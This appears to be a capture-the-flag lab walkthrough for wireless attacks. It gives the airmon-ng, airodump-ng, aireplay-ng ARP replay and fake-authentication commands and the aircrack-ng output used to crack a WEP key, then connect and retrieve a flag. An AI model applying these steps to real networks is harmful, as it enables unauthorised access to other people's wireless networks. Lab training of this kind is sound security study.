## DO THIS FIRST - Enumeration
### 1. Ensure monitor mode
```
# change to user to root first
kali@kali:~$ sudo su

# iwconfig to list all the wireless devices on this computer
root@kali:~# iwconfig

# find the wireless interface and put it onto monitor mode
root@kali:~# airmon-ng start wlan0

# run iwconfig again to ensure the interface is in monitor mode. Note that the interface might change name so use the new name from here on
root@kali:~# iwconfig
```
### 2. Find APs
```
# scan the wifi activity using airodump-ng note down the ESSID, BSSID, Channel, Auth for targeted sniffing. 
root@kali:~# airodump-ng <interface_name>
e.g:
root@kali:~# airodump-ng wlan0mon

CH 128 ][ Elapsed: 42 s ][ 2024-11-11 15:13 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:1A  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp         
 F0:9F:C2:7A:33:28  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-regional-tabl
 F0:9F:C2:71:22:15  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp         


```
## CHOOSE FOR THE RESPECTIVE AUTH
### 3a. If AUTH is **WEP**
#### Theory
```
- 24-bit IV
    - Susceptible to related-key attack
    - 50% probability that IV is reused after 5000 packets
- Eavesdropping enough packets of WEP handshake can crack the password
```
#### Method
```
Steps
# 1. Do targeted sniffing of the AP (that you are interested in) and write to a file.
- Note:
a. Can choose to use ESSID or BSSID.
b. Get the details of the station connected to the AP same as ESSID, BSSID, Channel
root@kali:~# airodump-ng <interface_name> --essid <ESSID> --channel <CHANNEL_NO >-w <FILENAME>

e.g:
root@kali:~# airodump-ng wlan0mon --essid wifi-old --channel 3 -w wep
​
# 2. Replay ARP requests in the network, using aireplay-ng in another terminal [Create another SSH session]
Note: Station is the BSSID of the station connected to the AP
root@kali:~# aireplay-ng -3 -b <BSSID> -h <Station> <Interface>

e.g.
root@kali:~# aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3A:2E:A2:2B:48:22 wlan0mon

​
3. Crack the WEP handshake captured in the file
sudo aircrack-ng <File_Name> -w /usr/share/wordlists/rockyou.txt





F0:9F:C2:71:22:11  -28        5      152    0   3   54   WEP  WEP         wifi-old    

root@WiFiChallengeLab:/home/user/Desktop/captures/wep# airodump-ng --bssid F0:9F:C2:71:22:11 --channel 3 --write wep3 wlan0 

# get more packets by doing fake auth + arpreplay attack
root@WiFiChallengeLab:/home/user# aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0
root@WiFiChallengeLab:/home/user# aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h 3A:2E:A2:2B:48:22 wlan0

# after getting enough packets - use aircrack-ng to crack
root@WiFiChallengeLab:/home/user/Desktop/captures/wep# aircrack-ng wep3-01.cap 
Reading packets, please wait...
Opening wep3-01.cap
Read 293952 packets.

   #  BSSID              ESSID                     Encryption

   1  F0:9F:C2:71:22:11  wifi-old                  WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening wep3-01.cap
Read 293952 packets.

1 potential targets

Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 133975 ivs.
                         KEY FOUND! [ 11:BB:33:CD:55 ] 
	Decrypted correctly: 100%

How to connect to target:
1. create a conf file
nano wep.conf
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11BB33CD55
  wep_tx_keyidx=0
}

2. root@WiFiChallengeLab:/home/user/Desktop/captures/wep# wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
3. on another terminal run: root@WiFiChallengeLab:/home/user# dhclient wlan2 -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan2/02:00:00:00:02:00
Sending on   LPF/wlan2/02:00:00:00:02:00
Sending on   Socket/fallback
DHCPREQUEST for 192.168.16.84 on wlan2 to 255.255.255.255 port 67 (xid=0xbb4af0d)
DHCPNAK from 192.168.1.1 (xid=0xdafb40b)
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0x9e96451)
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 8 (xid=0x9e96451)
DHCPOFFER of 192.168.1.84 from 192.168.1.1
DHCPREQUEST for 192.168.1.84 on wlan2 to 255.255.255.255 port 67 (xid=0x5164e909)
DHCPACK of 192.168.1.84 from 192.168.1.1 (xid=0x9e96451)
bound to 192.168.1.84 -- renewal in 41214 seconds.

go to http://192.168.1.1 from browser to find the flag

flag{c342fe657870020a1b164f2075f447564fdd1c3d}
```
